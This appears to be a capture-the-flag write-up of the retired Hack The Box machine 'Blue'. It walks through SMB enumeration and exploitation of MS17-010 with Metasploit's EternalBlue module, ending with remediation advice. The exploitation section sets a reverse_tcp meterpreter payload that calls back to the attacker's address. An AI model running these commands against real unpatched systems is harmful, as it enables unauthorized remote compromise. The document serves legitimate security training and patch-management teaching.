> [!NOTE]
> **Machine notes.** Credentials, hashes and flags are redacted; output is
> illustrative. Blue is retired; complete it on Hack The Box for the real values.

## Executive summary

Blue is the Hack The Box counterpart to the well-known TryHackMe room of the same
name. A Windows host exposes SMB with an unpatched service, and exploitation yields
`NT AUTHORITY\SYSTEM` directly.

The lesson is patch management: the entire compromise follows from a build number.

## Machine information

| Field | Value |
| --- | --- |
| Platform | Hack The Box |
| Machine | Blue |
| Difficulty | Easy (retired) |
| Operating system | Windows |
| Category | Windows exploitation |
| Skills | SMB enumeration, vulnerability identification, privilege context |

## Objectives

- Identify the Windows build and SMB configuration.
- Match the build to a public remote code execution issue.
- Obtain a session and confirm the privilege level.
- Explain the remediation in patch-management terms.

## Tools used

| Tool | Purpose |
| --- | --- |
| `nmap` | Service and OS detection |
| `smbclient` | Share inspection |
| Metasploit | Exploitation |
| `systeminfo` | Local patch context |

## Initial reconnaissance

```bash
nmap -Pn -sV -sC -p- <machine-ip> -oN nmap-blue.txt
```

```bash
nmap -Pn -p 445 --script smb-os-discovery,smb-security-mode,smb-protocols <machine-ip>
```

Record the OS build, SMB dialect support and signing state. The build is the
vulnerability indicator; the room name is not evidence.

## Enumeration

```bash
smbclient -L //<machine-ip>/ -N
smbmap -H <machine-ip>
```

Look for readable shares and any file that reveals patch history or credentials. On
this machine the share enumeration is secondary to the build number, but record it
anyway: in a real assessment, a readable share is its own finding.

## Vulnerability identification

Finding: an unpatched Windows build with SMBv1 enabled, reachable from the network,
is vulnerable to a known remote code execution class.

Confirm the prerequisites:

- SMBv1 negotiation succeeds.
- The build predates the vendor patch.
- Port 445 is reachable from your position.

All three must hold. A build string alone is not enough.

## Exploitation

```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS <machine-ip>
msf6 > set LHOST <your-vpn-ip>
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > run
```

If the exploit fails, check the target's boot state and your VPN routing before
changing payloads. Windows machines in labs need time to finish starting services.

## Privilege escalation

Not required. The exploit returns a SYSTEM-level session. Verify:

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```cmd
whoami /priv
systeminfo
```

The relevant observation is that the vulnerable service ran as SYSTEM, so the
service bug is a full compromise rather than a privilege boundary crossing.

## Flags and completion evidence

Flags are redacted. Record the build string, the SMB dialect result, and the `getuid`
output. Those three artefacts explain the entire path.

## Lessons learned

- Patch level is the primary control for this class.
- SMBv1 should be disabled regardless of patch state.
- A service running as SYSTEM makes any memory-corruption bug critical.
- Framework modules hide prerequisites; read the options before running.

## Mitigation and remediation

| Issue | Control |
| --- | --- |
| Missing security update | Patch; verify with a vulnerability scanner |
| SMBv1 enabled | Disable the protocol |
| SMB exposed externally | Firewall; VPN-only management |
| No detection | Alert on exploit signatures and anomalous service creation |

## References

- Hack The Box — Blue.
- Microsoft security bulletin for the SMBv1 vulnerability class.
- MITRE ATT&CK — Exploitation of Remote Services.
